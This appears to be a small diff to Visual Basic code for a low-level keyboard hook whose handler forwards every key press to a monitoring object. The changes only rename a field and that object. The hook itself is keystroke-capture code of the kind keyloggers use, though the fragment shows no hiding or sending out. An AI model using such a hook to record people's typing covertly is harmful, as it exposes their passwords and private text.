@@ -4,7 +4,7 @@ Private Type PKBDLLHOOKSTRUCT
     vkCode As Long
     scanCode As Long
     flags As Long
-    Time As Long
+    time As Long
     dwExtraInfo As Long
 End Type
  
@@ -18,7 +18,7 @@ Public Function HookProc(ByVal nCode As Long, ByVal wParam As Long, ByVal lParam
     If nCode = HC_ACTION And wParam = WM_KEYDOWN Then
         Dim p As PKBDLLHOOKSTRUCT
         Call CopyMemory(p, ByVal lParam, Len(p))
-        MonPage.CarryKeyBoard CodeToString(p.vkCode)
+        Moni.CarryKeyBoard CodeToString(p.vkCode)
     End If
 
 sth:
